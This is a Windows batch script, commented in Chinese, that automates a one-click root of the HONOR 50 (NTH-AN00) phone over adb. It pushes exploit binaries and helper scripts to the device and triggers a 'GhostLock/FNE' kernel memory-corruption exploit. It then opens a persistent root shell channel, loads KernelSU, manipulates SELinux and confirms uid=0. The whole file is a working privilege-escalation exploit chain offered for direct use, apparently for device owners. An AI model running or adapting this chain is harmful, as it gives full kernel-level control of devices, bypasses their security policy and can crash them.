@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title HONOR 50 (NTH-AN00) KernelSU 一键提权

rem ============================================================================
rem  HONOR 50 (NTH-AN00) 一键提权脚本
rem  链路：GhostLock/FNE 内核漏洞 -> 常驻 root FIFO 通道 -> ksud 晚加载 KernelSU
rem
rem  用法：手机开启 USB 调试并用数据线连接，双击本脚本即可。
rem  风险：内核内存破坏利用具有概率性，失败可能导致手机 panic 重启；
rem        重启后等手机开机，重新运行本脚本即可。
rem ============================================================================

set "D=/data/local/tmp/ksu_fne"
set "HERE=%~dp0"
set "TOOLS=%HERE%..\tools"
set "DEVSH=%HERE%device"
set "TMPF=%TEMP%\honor50_root"
if not exist "%TMPF%" mkdir "%TMPF%" >nul 2>&1

echo.
echo ================================================================
echo    HONOR 50 (NTH-AN00) KernelSU 晚加载 一键提权
echo    GhostLock / FNE 内核漏洞链  +  ksud insmod
echo ================================================================
echo.

rem ---------------- 0. 定位 adb ----------------
set "ADB="
where adb >nul 2>&1 && set "ADB=adb"
if not defined ADB (
  for %%P in (
    "%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"
    "%USERPROFILE%\platform-tools\adb.exe"
    "C:\platform-tools\adb.exe"
    "C:\adb\adb.exe"
    "C:\Android\platform-tools\adb.exe"
  ) do if not defined ADB if exist %%P set "ADB=%%~P"
)
if not defined ADB (
  echo [错误] 没有找到 adb。
  echo        请安装 Android Platform Tools，把 adb.exe 加入 PATH，
  echo        或者把 platform-tools 目录放到 C:\platform-tools\。
  goto :fail
)
echo [0/7] adb = %ADB%

rem ---------------- 1. 检测设备 ----------------
set "DEV="
for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
  if /i "%%b"=="device" if not defined DEV set "DEV=%%a"
)
if not defined DEV (
  echo [错误] 没有检测到已授权的 adb 设备。
  echo        检查：USB 调试已开启、手机上已点“允许 USB 调试”、数据线正常。
  goto :fail
)
echo [1/7] 设备序列号 = %DEV%
"%ADB%" shell getprop ro.product.model > "%TMPF%\model.txt" 2>nul
set "MODEL="
set /p MODEL=<"%TMPF%\model.txt"
echo         机型       = !MODEL!

rem ---------------- 2. 是否已经是 root ----------------
"%ADB%" shell su -c id > "%TMPF%\su0.txt" 2>nul
findstr /c:"uid=0" "%TMPF%\su0.txt" >nul 2>&1
if not errorlevel 1 (
  echo [2/7] 设备已经处于 root 状态（KernelSU 已加载），跳过漏洞利用阶段。
  goto :verify
)
echo [2/7] 当前未 root，开始执行提权流程。

rem ---------------- 3. 推送工具链与脚本 ----------------
echo [3/7] 推送工具链与脚本到设备 %D% ...
"%ADB%" shell "mkdir -p %D% /storage/emulated/0/root/_fne" >nul 2>&1
"%ADB%" push "%TOOLS%\e"             %D%/e             >nul
"%ADB%" push "%TOOLS%\fne_syms.txt"  %D%/fne_syms.txt  >nul
"%ADB%" push "%TOOLS%\kernelsu.ko"   %D%/kernelsu.ko   >nul
"%ADB%" push "%TOOLS%\ksud"          %D%/ksud          >nul
"%ADB%" push "%TOOLS%\magiskpolicy"  %D%/magiskpolicy  >nul
"%ADB%" push "%TOOLS%\ksu_rules"     %D%/ksu_rules     >nul
"%ADB%" push "%DEVSH%\fne_local.sh"  %D%/fne_local.sh  >nul
"%ADB%" push "%DEVSH%\chain_hook.sh" %D%/chain_hook.sh >nul
"%ADB%" push "%DEVSH%\ksu_lateload.sh"    /data/local/tmp/ksu_lateload.sh    >nul
"%ADB%" push "%DEVSH%\restore_enforce.sh" /data/local/tmp/restore_enforce.sh >nul
"%ADB%" shell "chmod 755 %D%/e %D%/ksud %D%/magiskpolicy %D%/fne_local.sh %D%/chain_hook.sh /data/local/tmp/ksu_lateload.sh /data/local/tmp/restore_enforce.sh" >nul 2>&1
"%ADB%" shell "rm -f /data/local/tmp/rs.in /data/local/tmp/rs.out %D%/chain.log %D%/chain_status %D%/fake_ksyms.txt /storage/emulated/0/root/_fne/fne_run.log" >nul 2>&1
echo         推送完成。

rem ---------------- 4. 触发内核漏洞利用 ----------------
echo [4/7] 触发 GhostLock / FNE 内核漏洞利用 ...
echo         这是内存破坏型利用，可能 panic 重启手机；重启后重新运行本脚本即可。
echo         设备端会自己重试，预计 1-5 分钟，期间请勿拔线 ...
"%ADB%" shell "sh %D%/fne_local.sh" > "%TMPF%\fne_out.log" 2>&1
echo         设备端流程已返回。

rem ---------------- 5. 等待常驻 root 通道 ----------------
echo [5/7] 等待常驻 root shell 通道 ...
set "CHAN="
for /l %%i in (1,1,40) do (
  if not defined CHAN (
    "%ADB%" shell "grep -c 'ROOT SHELL CHANNEL UP' /data/local/tmp/rs.out 2>/dev/null" > "%TMPF%\chan.txt" 2>nul
    set "CNT="
    set /p CNT=<"%TMPF%\chan.txt"
    if "!CNT!"=="1" (
      set "CHAN=1"
    ) else (
      timeout /t 3 /nobreak >nul
    )
  )
)
if not defined CHAN (
  echo [失败] 没有建立 root 通道，本次利用未成功。
  echo        常见原因：内存破坏利用是概率性的，本轮没打中；
  echo                  或者 W1b 没拿到（sig_enforce 仍为 Y）。
  echo        处理：如果手机已经重启，等它开机后重新运行本脚本。
  echo        现场日志：%D%/chain.log
  echo                  /storage/emulated/0/root/_fne/fne_run.log
  goto :fail
)
echo         root 通道已建立。

rem ---------------- 6. 通过通道加载 KernelSU ----------------
echo [6/7] 通过 root 通道加载 KernelSU 模块（ksud insmod）...
"%ADB%" shell "echo sh /data/local/tmp/ksu_lateload.sh > /data/local/tmp/rs.in" >nul 2>&1
set "LOADED="
for /l %%i in (1,1,40) do (
  if not defined LOADED (
    "%ADB%" shell "grep -c KSUTRY_DONE /data/local/tmp/rs.out 2>/dev/null" > "%TMPF%\done.txt" 2>nul
    set "DN="
    set /p DN=<"%TMPF%\done.txt"
    if "!DN!"=="1" (
      set "LOADED=1"
    ) else (
      timeout /t 3 /nobreak >nul
    )
  )
)
if not defined LOADED echo [警告] 没等到 ksud 完成标记，仍继续做验证。
"%ADB%" shell "grep kernelsu /proc/modules" > "%TMPF%\mod.txt" 2>nul
echo         模块状态 ：
type "%TMPF%\mod.txt"

rem ---------------- 7. 恢复 SELinux 为 Enforcing ----------------
echo [7/7] 把 SELinux 切回 Enforcing ...
"%ADB%" shell "echo sh /data/local/tmp/restore_enforce.sh > /data/local/tmp/rs.in" >nul 2>&1
timeout /t 10 /nobreak >nul

rem ---------------- 验证 ----------------
:verify
echo.
echo ======================== 验 证 结 果 ========================
"%ADB%" shell getenforce > "%TMPF%\enf.txt" 2>nul
set "ENF="
set /p ENF=<"%TMPF%\enf.txt"
echo   SELinux      : !ENF!
"%ADB%" shell "su -c id" > "%TMPF%\suid.txt" 2>nul
set "SUID="
set /p SUID=<"%TMPF%\suid.txt"
echo   su -c id     : !SUID!
"%ADB%" shell "su -c 'cat /proc/self/attr/current'" > "%TMPF%\dom.txt" 2>nul
set "DOM="
set /p DOM=<"%TMPF%\dom.txt"
echo   su 运行域    : !DOM!
"%ADB%" shell "grep kernelsu /proc/modules" > "%TMPF%\mod2.txt" 2>nul
set "MOD="
set /p MOD=<"%TMPF%\mod2.txt"
echo   内核模块     : !MOD!
"%ADB%" shell "su -c 'echo rootwrite > /data/local/tmp/roottest/proof.txt && cat /data/local/tmp/roottest/proof.txt'" > "%TMPF%\wr.txt" 2>nul
set "WR="
set /p WR=<"%TMPF%\wr.txt"
echo   root 写测试  : !WR!
echo =============================================================

findstr /c:"uid=0" "%TMPF%\suid.txt" >nul 2>&1
if errorlevel 1 (
  echo.
  echo [失败] su 提权没有成功。
  echo        请把上面的输出连同 %D%/chain.log 一起反馈。
  goto :fail
)

if /i not "!ENF!"=="Enforcing" (
  echo.
  echo [提示] SELinux 目前是 !ENF!，尚未切回 Enforcing。
  echo        手动恢复：adb shell "su -c 'echo 1 ^> /sys/fs/selinux/enforce'"
)

echo.
echo ================================================================
echo    成功：设备已获得 root（uid=0），KernelSU 模块 Live
echo ================================================================
echo    用法：adb shell su -c "命令"
echo    提醒：本次是 late-load（开机后手动加载），重启后需要重新运行本脚本。
echo.
pause >nul
exit /b 0

:fail
echo.
echo 流程中止。按任意键退出。
pause >nul
exit /b 1
